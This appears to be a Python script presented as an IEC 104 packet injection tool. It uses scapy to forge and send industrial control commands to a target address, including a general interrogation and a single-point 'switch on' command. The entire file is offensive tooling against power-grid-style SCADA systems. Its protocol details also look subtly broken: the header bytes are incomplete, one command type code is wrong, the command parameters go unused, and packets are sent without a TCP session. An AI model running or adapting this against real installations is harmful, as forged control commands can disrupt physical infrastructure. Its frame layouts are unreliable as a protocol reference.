#!/usr/bin/env python3
"""
IEC 104 packet injection tool.
Crafts and sends IEC 104 command packets to target.

Usage:
    sudo python iec104_inject.py <target_ip> <port> <command_type>

Example:
    sudo python iec104_inject.py 192.168.1.100 2404 general_interrogation
"""

from scapy.all import *
import sys
import random

target = sys.argv[1] if len(sys.argv) > 1 else "192.168.1.100"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 2404
cmd_type = sys.argv[3] if len(sys.argv) > 3 else "general_interrogation"


def create_iec104_frame(asdu_type, tx_sn=0, rx_sn=0):
    """Create IEC 104 I-Frame (Information Frame)."""
    # APCI header: Start, Type, Length
    apci_header = bytes(
        [
            0x68,  # Start
            0x09,  # Length (9 bytes of ASDU)
            tx_sn << 1,  # TX sequence number
            rx_sn,  # RX sequence number
        ]
    )

    # ASDU header
    asdu = bytes(
        [
            asdu_type,  # ASDU type (e.g., 0x64 = C_IC_NA_1)
            0x01,  # Number of information objects
            0x80,  # SQ, CU flags
            0x01,  # Cause of transmission (act = 1)
            0x00,  # Common address of ASDU (high)
            0x01,  # Common address of ASDU (low)
            0x00,  # Object address (high)
            0x01,  # Object address (low)
            0x01,  # Command (action = on)
        ]
    )

    return apci_header + asdu


def send_general_interrogation():
    """Send general interrogation command (C_IC_NA_1)."""
    payload = create_iec104_frame(0x64)

    pkt = (
        IP(dst=target)
        / TCP(dport=port, sport=random.randint(40000, 60000), flags="PA")
        / Raw(load=payload)
    )
    send(pkt, verbose=0)
    print(f"[+] Sent General Interrogation to {target}:{port}")


def send_command(obj_addr=1, cmd_value=1):
    """Send control command (C_SC_NA_1)."""
    payload = create_iec104_frame(0x45)

    pkt = (
        IP(dst=target)
        / TCP(dport=port, sport=random.randint(40000, 60000), flags="PA")
        / Raw(load=payload)
    )
    send(pkt, verbose=0)
    print(f"[+] Sent Command to {target}:{port} (Obj={obj_addr}, Val={cmd_value})")


if __name__ == "__main__":
    if cmd_type == "general_interrogation":
        send_general_interrogation()
    elif cmd_type == "command":
        send_command()
    else:
        print(f"[-] Unknown command: {cmd_type}")
        print("[*] Available: general_interrogation, command")
